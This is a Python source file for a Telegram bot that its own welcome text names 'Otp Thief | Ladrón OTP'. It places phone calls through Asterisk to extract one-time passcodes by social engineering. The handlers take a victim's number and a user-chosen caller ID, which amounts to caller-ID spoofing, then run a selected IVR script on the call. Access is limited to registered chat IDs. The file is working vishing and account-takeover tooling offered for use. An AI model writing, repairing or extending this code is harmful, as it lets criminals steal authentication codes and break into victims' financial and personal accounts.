# telegram_handler.py
from telegram.ext import Application, CommandHandler, MessageHandler, filters
from audio_conversation import get_conversation_handler
from config import TELEGRAM_TOKEN,  IVR_OPTIONS, user_data
from json_handler import get_chats_ids
from models import Params
from register_handler import get_registration_handler


async def send_telegram_message(chat_id: int, message: str):
    """Enviar mensaje a Telegram."""
    application = Application.builder().token(TELEGRAM_TOKEN).build()
    await application.bot.send_message(chat_id=chat_id, text=message)

class TelegramBot:
    def __init__(self, asterisk_manager):
        self.asterisk_manager = asterisk_manager

    async def start(self, update, context):
        """Comando /start para introducir la aplicación."""
        chat_id = update.effective_chat.id
        message = (
            "🦾 *Otp Thief | Ladrón OTP* 💻\n\n"
            "🕶️ Esta herramienta está diseñada para sacar  códigos OTP atraves de llamadas telefónicas "
            "utilizando tácticas de *ingeniería social*\n"
            "🚀 *Comandos disponibles:*\n"
            "📌 /start - Mostrar esta introducción\n"
            "📞 /call - Iniciar una  llamada\n"
            "❌ /hangup - Finalizar la llamada activa\n"
            "🎙️ /generate - Generar un mensaje de audio personalizado\n"
            "🔑 /register - Registrarse para usar el bot\n")
        await update.message.reply_text(message, parse_mode="Markdown")


    async def start_call(self, update, context):
        """Iniciar proceso de llamada."""
        chat_id = update.effective_chat.id

        # Obtener los chat IDs autorizados
        AUTHORIZED_CHAT_IDS = await get_chats_ids()

        # Verificar si el chat_id está autorizado
        if chat_id not in AUTHORIZED_CHAT_IDS:
            await send_telegram_message(chat_id, "Regístrate para usar este bot. /register")
            return

        # Verificar si el usuario ya está en otro paso
        current_step = user_data.get(chat_id, {}).get('step', 'idle')
        if current_step != 'idle':
            await send_telegram_message(chat_id, "⚠️ Llamada en curso.")
            return

        # Todo está correcto, iniciar proceso
        await send_telegram_message(chat_id, "📱 Ingresa el número:")
        user_data[chat_id] = {'step': 'phone'}


    async def hangup(self, update, context):
        """Colgar llamada activa."""
        chat_id = update.effective_chat.id
        channel = user_data.get(chat_id, {}).get('channel')
        if channel:
            await self.asterisk_manager.hangup_call(channel, chat_id)
            user_data[chat_id] = {'step': 'idle'}
        else:
            await send_telegram_message(chat_id, "❌ No hay llamada activa")

    async def handle_message(self, update, context):
        """Procesar mensajes del usuario."""
        chat_id = update.effective_chat.id
        if chat_id not in user_data:
            await send_telegram_message(chat_id, "📞 Usa /call para iniciar")
            return

        step = user_data[chat_id].get('step')
        if step == 'phone':
            phone_number = update.message.text.strip()
            if len(phone_number) < 5:
                channel = f'PJSIP/{phone_number}'
            else:
                channel = f'PJSIP/{phone_number}@callwithus'

            user_data[chat_id]['channel'] = channel
            user_data[chat_id]['step'] = 'caller_id'
            await send_telegram_message(chat_id, "📞 Ingresa el Caller ID (Número):")
        elif step == 'caller_id':
            caller_id = update.message.text.strip()
            if not caller_id.isdigit():
                await send_telegram_message(chat_id, "⚠️ Caller ID debe ser solo números. Intenta de nuevo:")
                return

            user_data[chat_id]['caller_id'] = caller_id
            user_data[chat_id]['step'] = 'ivr'
            options_text = "🔍 Selecciona:\n" + "\n".join(
                [f"{key}. {value['description']}" for key, value in IVR_OPTIONS.items()]
            )
            await send_telegram_message(chat_id, options_text)
        elif step == 'ivr':
            ivr_choice = update.message.text.strip()
            if ivr_choice in IVR_OPTIONS:
                ivr_context = IVR_OPTIONS[ivr_choice]["context"]
                params = Params(
                    channel=user_data[chat_id]['channel'],
                    ivr=ivr_context
                )
                caller_id = user_data[chat_id]['caller_id']
                await send_telegram_message(chat_id, f"📞 Llamando... {IVR_OPTIONS[ivr_choice]['description']}")
                await self.asterisk_manager.initiate_call(params, chat_id, caller_id=caller_id)
            else:
                await send_telegram_message(chat_id, "⚠️ Opción inválida")


    def setup(self):
        """Configurar manejadores del bot."""
        application = Application.builder().token(TELEGRAM_TOKEN).build()
        application.add_handler(CommandHandler("start", self.start))
        application.add_handler(CommandHandler("call", self.start_call))
        application.add_handler(CommandHandler("hangup", self.hangup))
        application.add_handler(get_conversation_handler())
        application.add_handler(get_registration_handler())
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))
        return application